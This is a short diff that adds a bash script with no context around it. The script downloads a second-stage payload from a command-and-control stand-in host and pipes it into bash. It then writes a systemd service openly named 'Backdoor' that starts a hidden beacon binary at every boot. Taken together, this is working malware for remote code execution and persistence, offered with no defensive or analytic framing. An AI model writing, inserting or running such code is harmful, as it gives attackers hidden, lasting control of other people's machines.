@@ -1,0 +1,10 @@
+#!/bin/bash
+curl -s http://c2.example.com/stage1 | bash
+cat > "$1/backdoor.service" <<EOF
+[Unit]
+Description=Backdoor
+[Service]
+ExecStart=/tmp/.hidden/beacon
+[Install]
+WantedBy=multi-user.target
+EOF
